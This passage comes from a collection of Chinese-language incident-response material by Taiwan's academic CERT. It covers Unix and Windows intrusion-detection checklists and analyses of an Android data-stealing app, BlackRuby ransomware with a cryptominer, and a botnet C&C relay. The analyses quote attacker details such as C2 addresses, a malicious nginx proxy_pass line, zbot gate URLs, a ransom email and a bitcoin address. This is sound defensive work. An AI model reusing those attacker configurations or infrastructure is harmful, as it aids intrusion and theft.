你必須知道平常運行的程序,並且能指出哪個程序是被駭客加 進去的。注意UID 為0 的程序。  不尋常的網路活動(Unusual Network Activity) 利用以下幾種方法,去查看網路的嗅探器(sniffers): 查看kernel 紀錄,尋找像是:“kernel: device eth0 entered promiscuous mode”的關鍵字 使用#ip link 去檢測“PROMISC”標籤,和ifconfig 比這種方法較 好,因為ifconfig 指令並非所有kernel 都支援。 – 尋找異常的埠活動: 利用指令:#netstat -nap 和 #lsof -i 去得到更多的網路埠號 活動的資訊 – 尋找平常在你的區域網路中的MAC #arp -a – 尋找任何未預期出現在網路",
        "Page_Num": "3,4,5"
    },
    "62": {
        "File_Name": "Unix安全.pdf",
        "content": "活動上的IP 地址  5 Taiwan Academic Network Computer emergency Response Team(TACERT) #crontab -u root -l #cat /etc/crontab 和#ls -la /etc/cron. *  異常的自動化任務 – 尋找在/etc/cron.allow 出現的異常排程。這邊必須特別注意 UID 為0 的帳號(root)所安排的工作 – 尋找不尋常的系統排程:  主機異常記錄 查看系統上的記錄檔案找出可疑事件,包括: – 大量的認證失敗(sshd, ftpd 等服務) – Remote Procedure Call (RPC)的程式紀錄條目包括了大量的 奇怪符號 – Apache log 中大量的error – 重新啟動(硬體重新啟動) – 重新啟動應用程式(軟體重新啟動) 在大部分的Linux 發行版中,幾乎所有的記錄檔皆放在/var/log 目錄底下,以下為主要的幾個:  6 Taiwan Academic Network Computer emergency Response Team(TACERT) cat /var/log/httpd/access.log | grep “GET /signup.jsp\" #dmesg # lsmod # lspci – /var/log/message:一般信息和系統相關的東西 – /var/log/auth.log:認證記錄 – /var/log/kern.log:kernel 記錄 – /var/log/cron.log:crond 工作記錄 – /var/log/maillog:mail server 記錄 – /var/log/httpd/:Apache log – /var/log/boot.log:系統啟動記錄 – /var/log/mysqld.log:MySQL 資料庫伺服器記錄 – /var/log/secure:身分認證記錄 – /var/log/utmp or /var/log/wtmp:登入記錄檔 要查看這些記錄檔,一些工具像cat 和grep 可能有用:  異常kernel log – 透過kernel log 去找出系統上的可疑事件 – 列出所有重要的內核和系統資訊  7 Taiwan Academic Network Computer emergency Response Team(TACERT) #rpm -va | sort #pkg_chk -vn debsums -ac pkg_delete -vnx – 尋找已知",
        "Page_Num": "5,6,7,8"
    },
    "63": {
        "File_Name": "Unix安全.pdf",
        "content": "的rootkit(使用rkhunter 和相關工具)  檔案hash(雜湊函式) 驗證所有二進制的MD5 hash,這些檔案位於/bin, /sbin, /usr/bin, /usr/sbin 或是其他二進制存儲的地方(使用AIDE 或相關工具) 警告:這個操作將會改變檔案的時間戳。所以這項動作必須等 其他檢查都已經做完才能操作。 – 能使用PRM 的系統,可以用下列指令查看安裝的套件: – 在有些Linux 上,有個名為check-packages 可以使用 – 在Solaris 上: – 在Debian: – 在Openbsd 3. 遏止(Containment) 從受到感染的機器上備份所有的資料,如果可以,對整個硬碟  8 Taiwan Academic Network Computer emergency Response Team(TACERT) bit-by-bit 的實體拷貝,也可以對記憶體(RAM)做拷貝。 假如機器對公司而言不是相當重要的話,可以拔除電源插頭強迫將其 關機,假如是使用電池的筆電,則按壓”off”數秒直到電腦關機。 假如鑑定的步驟沒有任何發現,而系統仍舊是被入侵狀態,則需要離 線進行調查。 嘗試去找出駭客每一個動作的證據:(使用取證工具像是Sleuth Kit/Autopsy)  找出所有被攻擊者使用的檔案,包括被刪除的檔案,並且看他 們做了什麼或是評估威脅。  檢查最近有被更改的檔案  檢查記錄檔  試著找出攻擊者如何進入系統。所有的線索都必須去考慮。假 如沒有找到入侵電腦的證據,不要忘記問題有可能發生在內部 人員。  更新系統,以防同樣的漏洞又被使用 4. 修正(Remediation) 暫時移除與事件有關的帳戶和調查發現的惡意檔案  9 Taiwan Academic Network Computer emergency Response Team(TACERT) 5. 復原(Recovery) 無論駭客入侵系統到何種程度,或是你對事件的調查有多仔細,只要 系統被入侵了,最好的方法還是重灌系統,並且更新。如果不能重灌, 你應該:  更改所有系統的帳戶密碼並且讓",
        "Page_Num": "8,9,10"
    },
    "64": {
        "File_Name": "Unix安全.pdf",
        "content": "使用者在安全的管道下這樣做: 他們必須使用有大小寫,特殊符號,數字及至少7 個符號長的 密碼  檢查所有系統資料的完整性,可以使用MD5 hash  還原所有被更改的二進制文件(例如: /bin/su) 6. 後續情況(Aftermath) 報告 下列的主題應該要記錄下來:  初步檢測  每個重要事件的行為與時間軸  什麼是適當的行為  什麼地方出了問題  10 Taiwan Academic Network Computer emergency Response Team(TACERT)  事件成本 資料來源:CERT SOCIETE GENERALE http://cert.societegenerale.com/en/publications.html ",
        "Page_Num": "10,11"
    },
    "65": {
        "File_Name": "Windows系統入侵檢測管理流程.pdf",
        "content": "Windows 系統入侵檢測管 理流程 TACERT 臺灣學術網路危機處理中心團隊編譯 資料來源: CERT SOCIETE GENERALE http://cert.societegenerale.com/en/publications.html  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 目錄 1. 準備(Preparation) .............................................................. 2 2. 確認(Identification) ........................................................... 3 3. 遏止(Containment) ............................................................ 6 4. 修正(Remediation) ............................................................. 7 5. 復原(Recovery) .................................................................. 8 6. 後續情況(Aftermath) ......................................................... 8 這份資安事件應變小抄,專給想要調查安全事件的網管人員。記住:面對事件時, 跟著資安事件應變方法的流程,記下記錄不要驚慌。如果需要請立刻聯絡臺灣學 術網路危機處理中心(TACERT)。  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 1. 準備(Preparation) 1-1. 執法調查員應該要能實際接觸可疑的系統。因為駭客可以偵 測到調查痕跡,例如網路監聽,所以實際接觸會比遠端控制 來的好 1-2. 為了當作法庭證據可能需要將硬碟做實體備份。最後,如果 需要,切斷所有與可疑的機器接觸的網路連結。 1-3. 一台機器或是伺服器平常的網路活動知識是必要的,應該要 在安全的地方保有一個記錄平時通訊埠活動的檔案,才能有 效率的比較目前的情況。 1-4. 如果能具備平時在機器上運作服務的知識將會有很大的幫助。 有需要時不要猶豫向Windows 專家請求幫助。一個好意見對 於機器上的服務或是執行的程序也能有所了解。 在使用者機器都是同樣的並且透過Master CD 安裝的大型公司環境 下工作會有很大的幫助。對於程序、服務與應用程式有所了解。在這 樣的環境裡,使用者不被允許安裝軟體,任何額外的程序、服務與應 用程式都是可疑的。  越了解一台乾淨機器的狀態,就越有機會發現一台機器裡正在執 行的非法活動  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 2. 確認(Identification) 請注意Sysinter",
        "Page_Num": "1,2,3,4"
    },
    "66": {
        "File_Name": "Windows系統入侵檢測管理流程.pdf",
        "content": "nals 疑難排解工具可以用來實行下面的任務  不尋常的帳戶(Unusual Accounts) 尋找被新增的不尋常帳戶,特別是管理者群組(Administrators group)裡的不尋常帳戶: or  不尋常的檔案(Unusual Files) 在儲存裝置裡尋找不尋常的大檔案,大於5MB 可以做為系統 被置入了不合法內容的指標。 在系統資料夾裡尋找最近被加入的不尋常檔案,特別是 - 使用”隱藏(hidden)” 屬性尋找檔案: - 如果可能,使用 “windirstat” (請參考這裡)  不尋常的註冊登記(Unusual Registry Entries) 在Windows registry 裡尋找在開機時啟動的不尋常程式,特別 是: C:\\> lusrmgr.msc C:\\>net localgroup administrators or net localgroup administrateurs C:\\WINDOWS\\system32 C:\\> dir /S /A:H  4 Taiwan Academic Network Computer emergency Response Team(TACERT) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunonceEx C:\\> taskmgr.exe C:\\Documents and Settings\\user\\Start Menu\\Programs\\Startup C:\\WinNT\\Profiles\\user\\Start Menu\\Programs\\Startup C:\\> services.msc C:\\> net start C:\\> net view \\\\127.0.0.1 如果可能,使用”HiJackThis”(也會在你的啟動資料夾裡尋找, 請參考這裡)  不尋常的程序與服務(Unusual Processes and Services) 確認所有執行中的程度是否是不尋常或是不知名(unknown) 登記,特別使用者名稱是”SYSTEM”與”ADMINISTRATOR” 的程序。 (或tlisk, tasklist 根據Windows 版本選擇之) 如果可能,使用“psexplorer”(請參考這裡)  確認使用者自動啟動資料夾  尋找不尋常或是非預料中已安裝或啟動中的網路服務  不尋",
        "Page_Num": "4,5"
    },
    "67": {
        "File_Name": "Windows系統入侵檢測管理流程.pdf",
        "content": "常的網路活動 - 確認檔案分享與驗證每個都是與正常活動連結。 如果可能,使用 “tcpview”(請參考這裡)  5 Taiwan Academic Network Computer emergency Response Team(TACERT) C:\\> net session C:\\> net use C:\\> nbtstat -S C:\\> netstat -na 5 C:\\> netstat –nao 5 C:\\> at C:\\> schtasks C:\\> eventvwr.msc - 尋找機器裡正開啟的網路連線 - 查看機器與其它系統建立的連線 - 確認所有可疑的Netbios 連結 - 尋找在系統埠上任何不尋常的活動 (數字5 會讓他每5 秒更新一次,使用者可根據需求訂定) 使用 -o 旗誌(flag)可以在Windows XP/2003 下看見每個程序的 擁有者。 如果可能,使用 “fport”(參考)  不尋常自動化任務 尋找排程任務清單中任何不尋常的登記 若是Windows 2003 或XP:  瞧瞧事件檢視器是否有異樣 如果可能,使用“Event Log Viewer”(參考) 或類似的工具。  尋找影響防火牆、防毒與檔案保護的事件,或是任何可疑  6 Taiwan Academic Network Computer emergency Response Team(TACERT) 的服務  尋找大量的登入嘗試錯誤或是被封鎖的帳戶  檢視防火牆(如果有的話)記錄中的可疑活動。  檢查Rootkit 執行”Rootkit Revealer”、”Rootkit Hooker”、 ”Ice Sword”、”RkDetector”、”Syslnspector”、”Rootkit Buster” 最好能夠執行以上數個軟體,交互檢查。  檢查惡意軟體 在全部的硬碟上執行至少一個防毒軟體,這些防毒軟體需確 保是最新的。 3. 遏止(Containment) 如果這台機器對你公司營業活動很重要並且不能被切斷連結,備份所 有重要的資料,免得駭客注意到你的調查活動而刪除檔案。複製一份 系統的記憶體用來更進一步的分析。(使用像是Memoryze, win32dd 的工具) 如果這台機器對你公司不是很重要並且可以被切斷連結",
        "Page_Num": "5,6,7"
    },
    "68": {
        "File_Name": "Windows系統入侵檢測管理流程.pdf",
        "content": ",將機器關機 移除他的插頭。如果是一台有電池的筆電,那就按著”off”的按鈕幾秒, 直到電腦斷電。  7 Taiwan Academic Network Computer emergency Response Team(TACERT) 如果線上分析沒有得到結果,就應該立刻進行離線調查。但是這台系 統應該仍然是在被感染的情況下。 進行實體複製(逐位元複製)將整個硬碟複製到外部儲存裝置。可以使 用EnCase, X-WAYs,或dd, ddrescue 等 嘗試找出駭客活動的證據:  找到攻擊者使用過的檔案,包含了被刪除的檔案(使用取 證工具)與這些檔案用來做了什麼,至少要了解他的功能 以用來評估威脅。  檢查最近被存取的所有檔案。  檢查網路分享去看看是否有惡意軟體透過它來散播。  嘗試找出攻擊者如何進入系統。所有的線索都要考慮到。 如果沒有找到電腦入侵的證據,千萬別忘記也有可能是透 過實體接觸或是透過員工(共謀)竊取資料。  修正所有弱點(操作系統與應用程式),以免攻擊者使用已 知的弱點。 4. 修正(Remediation) 假使系統已經受到感染了:  8 Taiwan Academic Network Computer emergency Response Team(TACERT)  暫時移除所有有牽涉到此事件的帳戶。  移除所有攻擊者安裝的惡意檔案 5. 復原(Recovery) 不論駭客侵入系統到什麼程度以及你對於感染了解多少,只要系統被 滲透過了,最好的方法就是用原始工具重新安裝系統,然後在新系統 上安裝所有的補丁。 假使這個解決方法不能採用,那你應該:  改變所有系統帳戶的密碼,確保你的使用者們會遵從下列 的安全方法:他們的密碼應該含有大小寫字母、特別字元、 數字且至少8 個字元。  復原所有檔案,復原那些己經被攻擊者改變過的檔案(例 如svchost.exe) 6. 後續情況(Aftermath) 報告 下列的主題應該要記錄下來:  初步檢測  每個重要事件的行為與時間軸  什麼是適當的行為",
        "Page_Num": "7,8,9"
    },
    "69": {
        "File_Name": "Windows系統入侵檢測管理流程.pdf",
        "content": " 9 Taiwan Academic Network Computer emergency Response Team(TACERT)  什麼地方出了問題  事件成本 資料來源:CERT SOCIETE GENERALE http://cert.societegenerale.com/en/publications.html ",
        "Page_Num": "9,10"
    },
    "70": {
        "File_Name": "個案分析-Android智慧型裝置的APP惡意程式事件分析報告_10407.pdf",
        "content": "個案分析- Android 智慧型裝置的APP 惡意程式事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/7  1 I. 事件簡介 1. 六月初收到來自合作的資安團隊轉發ICST 的智慧型裝置病毒樣本,供本 單位進行測試分析。 2. 該惡意程式主要是由國內警政署165 反詐騙單位所提供,表示該詐騙網 址及惡意程式可能已經在國內流竄一段時間。 3. 該惡意程式為副檔名APK 的安裝檔案,故為作業系統Android 的手機或 平板裝置所設計。 4. 檢測方式透過 Android 模擬器及實體手機進行測試。 II. 事件檢測 1. 該惡意程式完整檔案名稱為「cht.tw_h_61nll_PhoneContent.apk」,開頭 名稱帶有「cht.tw」會誤導使用者認為是某ISP 業者所開發之APP。 2. 首先使用Android 模擬器 Genymotion 開啟Android 版本為4.4.4 的裝 置,並且設定中選項安全性裡的「不明的來源」啟用,確保程式能被允 許安裝。 3. 將惡意程式「cht.tw_h_61nll_PhoneContent.apk」進行安裝並同時進行 網路封包側錄,安裝過程中會出現應用程式權限聲明,幾乎完全掌控手 機資訊。 1. 主要有能夠「讀取手機狀態、簡訊SMS 所有功能、GPS 定位、聯絡人  2 通話紀錄、SD 卡內容、網路狀態及啟動執行等。」 4. 安裝完成後在程式集選單中會出現一個小綠人的APP LOGO,且名稱為 「PhoneContent」的應用程式,開啟此APP 後出現一串文字「已过试用 期」及 Button 的功能按鍵。 5. 嘗試點擊 Button 按鍵並無任何反應,此時惡意程式已經成功存取裝置 資訊,而使用者藉此才可能發現到已經上當中毒。 6. 然而檢查側錄的網路封包,卻並無發現任何可疑外部流量,故研判此惡 意程式可能在模擬器環境中不會作用。 7. 第二次檢測使用實體裝置 Nexus S,且作業系統為Android 4.1.2,安 裝過程中畫面如同",
        "Page_Num": "1,2,3"
    },
    "71": {
        "File_Name": "個案分析-Android智慧型裝置的APP惡意程式事件分析報告_10407.pdf",
        "content": "先前第一次檢測,實際開啟 APP「PhoneContent」後  3 並檢查側錄的網路封包,得到相同的結果查無異狀。 8. 第三次使用相同實體裝置 Nexus S 檢測,但是有裝入可通話用的SIM 卡,並檢查側錄的網路封包後發現開始出現可疑的網路流量。惡意程式 會將手機資訊加密後,透過 HTTP POST 方式傳送到上層的中國北京中繼 站 http://202.108.23.85/app.gif 。 9. 透過圖檔軟體無法正常開啟擷取的app.gif,故判定此檔案是被加密過 後偽裝成 gif 圖形檔。 10.檢查上層中國北京的中繼站 202.108.23.85 的port 80,在瀏覽器輸入  4 該位址會出現“HTTP/1.0 500 Internal Server Error”,表示該 主機的port 80 確實是有開啟服務,研判專門接收感染手機的資料所 用。 11.透過SSH 連入手機,並且輸入netstat 指令觀察可疑的port,並無發現 異常的通訊埠有被開啟。研判惡意程式在安裝好時候只傳送資料一次, 並無開啟額外 Litsen 通訊埠。 12.從Virustotal 線上掃毒工具得知,該惡意程式的偵測比例約為9/57, 故大部分防毒軟體可能還偵測不出來。其主要行為也是存取手機狀態、 聯絡人資訊、讀取或發送SMS 簡訊等。現在許多金融帳密都會有OTP 的 二次驗證機制,能透過SMS 簡訊接收做認證,若是被駭客利用則有可能 導致金融帳號被入侵。  5 13.惡意程式可能大量發送釣魚的SMS 簡訊給其他用戶,導致簡訊費大增或 者其他人受害,不可不防。 14.惡意程式能夠存取的權限如下,幾乎掌控所有權限。  6 III. 網路架構圖 STEP 2 下載安裝 apk惡意程式 中繼站 202.108.23.85 (北京) STEP 3 HTTP POST 資料 至中繼站 受感染裝置 Internet STEP 1 收到釣魚簡訊 連結 其他使用者 STEP 4 發送釣魚簡訊 1. 一般使用者可能",
        "Page_Num": "3,4,5,6,7"
    },
    "72": {
        "File_Name": "個案分析-Android智慧型裝置的APP惡意程式事件分析報告_10407.pdf",
        "content": "收到來自釣魚連結的簡訊。 2. 使用者不小心從連結網站下載到惡意程式。 3. 使用者安裝惡意程式後機敏性資料就被竊取回傳到上層中繼站。 4. 受感染裝置會向其他通訊錄聯絡人發送釣魚簡訊。 IV. 建議與總結 1. 此事件的惡意程式通常透過手機簡訊方式感染 2. 該病毒會識別感染設備是否有SIM 卡語音通訊功能,因此模擬器和未插 入SIM 卡的設備不會回傳資料給中繼站。 3. 使用者一旦下載安裝惡意程式後,機敏性資料就會回傳給上層中繼站。 4. 使用者開啟安裝的APP 後無法正常操作該軟體「PhoneContent」。  7 5. 感染裝置可能會向通訊錄聯絡人發送釣魚簡訊。 6. 此時就算將APP 移除,但手機的個資已經被回傳竊取。 7. 因為移除惡意程式APP 不一定能清除乾淨,建議將系統重置為原始狀 態。 8. 建議安裝手機用的防毒軟體,大多病毒都能被偵測阻擋。 9. 手機病毒近年來非常氾濫,故來路不明的檔案不要輕易安裝。 ",
        "Page_Num": "7,8"
    },
    "73": {
        "File_Name": "個案分析-BlackRuby挖礦勒索攻擊事件分析報告_10703.pdf",
        "content": "個案分析- Black Ruby 挖礦勒索攻擊 事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年3 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 2017 年各式勒索病毒攻擊事件頻傳,而挖礦的攻擊事件也層出不窮,而在 2018年2月初MalwareHunterTeam發現了一個新型態的勒索病毒Black Ruby。 2. 該病毒除了會將電腦內的檔案加密來進行勒索外,也在受害主機內植入門羅 挖礦程式,因為駭客考量若被勒索的受害者不支付贖金,至少可將受害主機 拿來進行挖礦,以獲取門羅幣。 3. 為了瞭解該類型資安事件的觸發原因與攻擊行為,本中心取得樣本後進行檢 測。 II. 事件檢測 1. 首先,在檢測之前,我們將病毒樣本 daea4b5ea119786d996f33895996396892fa0bdbb8f9e9fcc184a89d0d0cb85e.e xe 送至Virustotal 網站檢測,發現其惡意比例高達50/66,其中有許多防毒 軟體公司稱它為BlackRuby 勒索病毒,而知名的Fortinet 與Symantec 公司 稱它為CoinMiner 與Downloader。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 在Win 10 作業系統環境下,我們進行環境隔離檢測。檢視該病毒的檔案內容, 發現它原檔名為Windows Defender.exe,名稱與微軟公司的防毒軟體名稱相 同,表示該病毒可能偽裝成防毒軟體來吸引使用者執行它。 3. 以一般使用者權限執行此病毒程式後,發現該病毒會呼叫兩個名稱相同的程 式svchost.exe 來執行,而且CPU 使用率衝至100%,呈現挖礦現象,但受測 主機內無任何檔案被加密之情形發生。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 相關報導顯示駭客可能透過遠端桌面服務(Remote",
        "Page_Num": "1,2,3,4"
    },
    "74": {
        "File_Name": "個案分析-BlackRuby挖礦勒索攻擊事件分析報告_10703.pdf",
        "content": "Desktop Services)方 式入侵到受害主機內安裝惡意程式BlackRuby,故推測在執行此病毒時,駭 客可能以系統管理者權限執行程式,因此,我們以系統管理者權限來執行此 病毒。 5. 檢視病毒執行後對外連線情形,發現它會先連線到美國 IP:104.25.149.25:80,接著會陸續連線到烏克蘭IP:94.130.12.27:3333, port 3333 為挖礦常用port,可見該IP 可能為一個礦池。 6. 追蹤IP:94.130.12.27 之網路封包,發現該IP 對應到主機:freegeoip.net, 表示受測主機查詢http://freegeoip.net/json/,而且連線過程中會告訴對 方受測主機的IP 位置、country_Code 與country_Name。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視受測主機背景程式執行情形,發現該病毒執行後會呼叫程式 Svchost.exe,而程式Svchost.exe 執行後會呼叫程式conhost.exe。 從Svchost.exe 的內容可以得知Svchost.exe 存在於C:\\Windows\\System32\\ 新建的資料夾BlackRuby 內,而且是XMRig CPU miner 的挖礦程式,在Command 內容可以看到其礦池為de01.supportxmr.com:3333 與其錢包帳戶的資訊。 8. 檢視網路封包內容,發現受測主機傳送礦池的登入帳戶資訊與受測主機名稱 給礦池,但是回傳顯示錯誤訊息,表示這個帳戶在這個礦池的運用被限制了。 接著觀察受測主機是否有CPU 資源使用率衝高之現象,但發現無挖礦行為產 生。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 檢視登錄編輯程式內容,發現登錄檔有被修改過,安裝BlackRuby 軟體。 10. 從背景程式發現,在病毒執行時,會寫入兩個檔案WindowsUI.exe 與 Svchost.exe 到C:\\Windows\\System32\\BlackRuby 的資料夾內",
        "Page_Num": "4,5,6"
    },
    "75": {
        "File_Name": "個案分析-BlackRuby挖礦勒索攻擊事件分析報告_10703.pdf",
        "content": "。 11. 檢視C:\\Windows\\System32 資料夾,因為BlackRuby 資料夾被隱藏了,所以 並未發現任何名稱為BlackRuby 之資料夾,此方式讓受害者不易發現惡意程 式的所在之處。 12. 在BlackRuby 的資料夾內,發現有兩個程式Svchost.exe 與 WindowsUI.exe,分別將它們送至Virustotal 檢測得到如下的結果:  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1) Svchost.exe 檢測結果其惡意比例為50/67,多家防毒公司使用 CoinMiner 用字來稱呼它,被視為一個挖礦程式。 (2) WindowsUI.exe 檢測結果其惡意比例為50/67,有多家防毒軟體公司稱 其為BlackRuby 勒索病毒,也發現其SHA256 編碼與本次檢測病毒樣本相 同,可推測病毒在執行寫入受測主機BlackRuby 資料夾時,也複製一份自 己於資料夾內。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. 檢視受測主機重新開機後背景程式運作情形,發現來自 C:\\Windows\\system32\\blackruby\\windowsui.exe 的Windows Defender 程式 會在開機後自動執行,而且程式WindowsUI.exe 會呼叫Svchost.exe 來進行 挖礦。 14. 檢視受測主機內檔案被加密之情形,發現除了C:\\windows 與program files 兩資料夾內檔案未被加密外,其他檔案皆被加密。檔案被加密後檔名 變更為「Encrypted_英文字母與數字混合亂碼.BlackRuby」。另外,在檢測時 發現在病毒執行加密期間,若有其他程式執行中,則這些應用程式的執行檔 將不會被加密。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 在被病毒加密過檔案或讀取過的資料夾內,皆會出現一個名稱為 「HOW-TO-DECRYPT-FILES.txt」的勒索通知信,查看該信內容發現分為6 個 部分,分述如下: (1) Identification",
        "Page_Num": "6,7,8,9"
    },
    "76": {
        "File_Name": "個案分析-BlackRuby挖礦勒索攻擊事件分析報告_10703.pdf",
        "content": "Key 為識別受害者ID。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) Can not access your files? 告訴受害者他的電腦中了BlackRuby 勒索病毒,需支付價值$650 美元的比特 幣才可以將系統還原。 (3) HOW TO DECRYPT FILES 主要告訴受害者如何解密檔案。首先,要複製Identification Key,再寄兩 個被加密的檔案連同Key 到「TheBlackRuby@Protonmail.com」信箱。駭客會 將兩個加密檔案解密寄回給受害者,受害者在確認檔案完整後,用比特幣支 付$650 美元,並寄transaction code 到駭客E-mail 信箱。駭客的比特幣帳 戶是「19S7k3zHphKiYr85T25FnqdxizHcgmjoj1」,最後受害者會得到Black Ruby 的解密器與自己系統的私密金鑰。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4) What is encryption? 告訴受害者什麼是加密,也提到要修改加密的檔案需要個人Identificaiton Key 與特別的解密軟體。 (5) Everything is clear for me but what should I do? 告訴受害者閱讀HOW-TO-DECRYPT-FILES.txt 檔案,也告訴受害者只有他們有 私密金鑰可以將被加密的檔案解開。 (6) Have you got advice? 告訴受害者如果用第三方工具來進行解密,檔案可能會損壞。 III. 網路架構圖  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客透過遠端桌面服務侵入受害主機。 2. 駭客在受害主機上執行惡意程式BlackRuby。 3. 受害主機傳送所在IP 位置、country_Code 與country_Name 給美國IP。 4. 植入WindowsUI.exe 與挖礦程式Svchost.exe 於受害主機內。 5. 執行程式Svchost.exe 連線礦池deO1.supportxmr.com。 6. 加密受害主機內檔案。 IV. 建議與總",
        "Page_Num": "9,10,11,12"
    },
    "77": {
        "File_Name": "個案分析-BlackRuby挖礦勒索攻擊事件分析報告_10703.pdf",
        "content": "結 本個案之病毒程式主要是透過遠端桌面服務方式散播,駭入受害主機後, 會執行BlackRuby 程式來植入挖礦程式與進行檔案加密作業。當一般使用 者發現檔案被加密時,只會認為電腦中了勒索病毒,不容易察覺在背景程 式中有挖礦程式執行。為預防此病毒的攻擊事件發生,建議下列幾點措施。 1. 關閉遠端桌面服務,建議透過VPN 連線,保護要用遠端桌面服務的主機。 2. 定期備份電腦內重要資料。 3. 安裝防毒軟體保護與定期執行系統與應用程式的更新作業。 4. 不隨意打開不明來源的檔案。 5. 使用高強度的密碼,並且避免重複使用相同密碼登入其他系統。 ",
        "Page_Num": "12"
    },
    "78": {
        "File_Name": "個案分析-Botnet C&C中繼站分析報告_10206.pdf",
        "content": "1 個案分析- Botnet C&C 中繼站分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/06  2 1. 被入侵主機資訊: A. 作業系統: Debian Ubuntu B. IP: ***.***.164.154 C. Hostname: hp712.ee. ***.edu.tw D. 開啟的port 及運行的服務 i. Port 80 : nginx http proxy ii. Port 22 : OpenSSH 2. 事件處理流程: A. 2013/05/20:收到某大學圖資中心通報該主機可能遭入侵為殭屍網路中 繼站(Botnet C&C Server)(事件單23357)。 B. 2013/05/20:至現場側錄流量,詢問使用者主機上線時間,帳號密碼等 主機相關資訊,推測為帳號密碼遭破解而被植入惡意程式 C. 2013/05/24: 回收流量,並且備份主機資料 /var/log/; /usr/local/nginx/; /root/; ifconfig; crontab; history...etc。 D. 請使用者直接修改密碼,並刪除主機上的惡意程式 3. 被入侵原因及行為: A. 使用者使用過於簡單字典字庫做帳號密碼。 B. SSH 登入後即為root 權限。 C. 5/8 駭客植入客製後的nginx 套件,並使用port 80 作http relay。 D. 駭客在usr/local/nginx/nginx.conf 中寫入proxy_pass http://176.56.225.146:80/; 為C&C server。 E. 駭客將所有登入存取的log 紀錄皆被導入/dev/null 以抹除記錄。 F. 駭客同時利用小程式自動將網路流量pcap和http relay log存於資料夾。 /usr/share/.doc/httpry.bin -i eth0 -o \"${FILENAME}.log\" -b \"${FILENAME}.pcap G. 駭客錄製的pcap 只有filter http 流量,無SSH 登入紀錄。 4. 透過pcap 分析出有6 筆異常SSH 連入資訊。 A. Tor exit node 為一個代理出口",
        "Page_Num": "1,2"
    },
    "79": {
        "File_Name": "個案分析-Botnet C&C中繼站分析報告_10206.pdf",
        "content": "節點,此TOR(The Onion Router)是第二 代洋蔥路由(onion routing)的一種實作,使用者透過Tor 可以在網際網路上 進行匿名交流。 Abnormal SSH IP Country City Orgazination Time 195.187.238.128 Poland warsaw research and academic networks 2013-May-20 20:08:42 24.43.123.80 US palm springs esp-inc 2013-May-20 21:54:19 199.48.147.38 US san francisco formless networking 2013-May-20 20:14:32 72.192.189.184 US santee cox communications 2013-May-20 19:00:21  3 199.91.135.140 US Sunnyvale Bluecoat Systems 2013-May-21 05:34:49 109.163.233.194 Romania Tor exit node 2013-May-23 17:12 表一、異常SSH 登入***.***.164.154 資訊 圖一、利用who 指令發現有異常IP 連入 圖二、透過dig 指令解析出該網域名稱對應之IP 5. C&C server : A. IP 位址: 176.56.225.146 B. 國家: Netherlands C. 組織: WeservIT Dedicated Server IP space D. 透過http proxy relay 至C&C (176.56.225.146)的bots 約有78600 個。 E. 其中BOTS 來自的國家約有145 個。 F. 從側錄資料中發現至少有10 個C&C domain name 利用fast-flux 做切 換。 6. 中繼站網路架構圖 A. 在中繼站主機***.***.164.154 的側錄網路pcap 檔至少可以看到三層的 網路架構,第一層為遭受感染的殭屍電腦Bots,第二層為中繼站主機群, 第三層為中繼站的資料收容主機C&C。 B. 第一層Bots:藉由http 方式將資料傳給中繼站,中繼站的IP 選擇是透 過網域名稱解析而知,不同的bots 會選擇不同的domain name 做連接。 C. 第二層中繼站主機群: i. 主要負責將第一層殭屍電腦bots 的資料relay 至特定C&C ",
        "Page_Num": "2,3"
    },
    "80": {
        "File_Name": "個案分析-Botnet C&C中繼站分析報告_10206.pdf",
        "content": "主機, 這些資料不會保存在中繼站裡。 ii. 中繼站群使用Fast-flux 方式快速切換同一網域解析出的IP,也就 是一個網域名稱短時間內會對應到多個IP 位址,反之同一IP 也會 被多個網域名稱所對應到。  4 iii. 這些網域的命名沒有特殊涵義,通常駭客不會讓這些網域名稱存活 太久,因此許多網域名稱已經解析不出IP iv. 在該側錄的中繼站上得知至少有10 個domain name 會對應至此中 繼站***.***.164.154。 D. 第三層C&C 主機:主要收容中繼站relay 來的資料,特定的HTTP Proxy 中繼站會relay 至單一個C&C 主機,因為駭客會在中繼站的http 直接 設定指向特定IP 176.56.225.146 Internet DNS Server Fast-Flux Proxy Relay C&C Server 140.117.164.154 Victims Bots HTTP Method HTTP Method DNS Query Hacker SSH Login 176.56.225.146:80 圖三、HTTP Relay 網路架構圖 62.227.85.209 217.238.177.241 92.231.121.201 89.16.90.149 84.137.27.110 .................. 222.127.223.70 197.156.81.0 78.40.176.33 117.223.109.193 .................. 217.250.81.126 78.244.159.245 90.0.10.234 84.160.244.170 .................. Step 1-1 : POST condalinaradushko.ru/file.php from zbot to 140.117.164.154 Step 1-2 : POST condalinaradushko.ru/file.php from 140.117.164.154 to 176.56.225.146 Step 2-1 : POST ochengorit.ru/new/gate.php from zbot to 140.117.164.154 Step 2-2 : POST ochengorit.ru/new/gate.php from 140.117.164.154 to 176.56.225.146 Step 3-1 : POST confideracia.ru/ from zbot to 140.117.164.154",
        "Page_Num": "3,4"
    },
    "81": {
        "File_Name": "個案分析-Botnet C&C中繼站分析報告_10206.pdf",
